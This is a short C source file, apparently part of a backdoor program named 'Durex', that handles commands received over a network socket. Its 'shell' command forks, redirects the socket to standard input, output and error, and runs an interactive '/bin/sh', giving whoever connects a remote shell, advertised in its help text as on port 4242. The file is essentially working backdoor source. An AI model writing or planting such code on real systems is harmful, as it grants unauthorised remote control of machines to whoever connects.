#include "Durex.h"

void builtin(int sd, char *buffer)
{
    // syslog(LOG_INFO, "%s", buffer);
    if (strcmp(buffer, "?") == 0)
    {
        send(sd, "?\tshow help\nshell\tSpawn remote shell on port 4242\n", 51, 0);
    }
    else if (strcmp(buffer, "shell") == 0)
    {
        pid_t   pid;

        pid = fork();
        if (pid == 0)
        {
            dup2(sd, 0);
            dup2(sd, 1);
            dup2(sd, 2);
            char *cmd[] = { "/bin/sh", "-i", NULL };
		    execvp(cmd[0], cmd);
        }
    }
    send(sd, "$>", 2, 0);
}